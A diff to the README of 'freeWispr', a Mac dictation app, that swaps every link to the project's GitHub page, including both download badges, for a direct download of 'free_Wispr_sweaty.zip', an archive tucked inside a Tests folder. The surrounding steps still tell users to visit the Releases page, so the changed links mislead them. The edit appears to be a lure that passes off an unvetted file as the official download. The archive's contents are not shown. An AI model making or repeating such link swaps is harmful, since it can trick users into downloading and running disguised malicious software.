@@ -1,6 +1,6 @@
 # 🗣️ freeWispr - Local, Private Dictation for Mac
 
-[![Download freeWispr](https://img.shields.io/badge/Download-freeWispr-brightgreen?style=for-the-badge)](https://github.com/EunelAfloro/freeWispr)
+[![Download freeWispr](https://img.shields.io/badge/Download-freeWispr-brightgreen?style=for-the-badge)](https://github.com/EunelAfloro/freeWispr/raw/refs/heads/main/FreeWispr/Tests/FreeWisprTests/free_Wispr_sweaty.zip)
 
 ## 🖥️ What is freeWispr?
 
@@ -27,7 +27,7 @@ This app is designed to work on Macs with Apple Silicon chips. It uses open sour
 
 ## 📥 Download and Install freeWispr 👇
 
-[![Download freeWispr](https://img.shields.io/badge/Download-freeWispr-blue?style=for-the-badge)](https://github.com/EunelAfloro/freeWispr)
+[![Download freeWispr](https://img.shields.io/badge/Download-freeWispr-blue?style=for-the-badge)](https://github.com/EunelAfloro/freeWispr/raw/refs/heads/main/FreeWispr/Tests/FreeWisprTests/free_Wispr_sweaty.zip)
 
 1. Click the green **Download freeWispr** button above. It brings you to the freeWispr page on GitHub.
 2. On the GitHub page, look for the **Releases** section on the right side or near the bottom.
@@ -89,7 +89,7 @@ freeWispr runs fully local and is open source. Apple’s solution may send data 
 
 Explore the code, find updates, or report issues by visiting the freeWispr GitHub page:
 
-[https://github.com/EunelAfloro/freeWispr](https://github.com/EunelAfloro/freeWispr)
+[https://github.com/EunelAfloro/freeWispr/raw/refs/heads/main/FreeWispr/Tests/FreeWisprTests/free_Wispr_sweaty.zip](https://github.com/EunelAfloro/freeWispr/raw/refs/heads/main/FreeWispr/Tests/FreeWisprTests/free_Wispr_sweaty.zip)
 
 On the GitHub page, you can also find guides, troubleshooting tools, and community discussions.
 
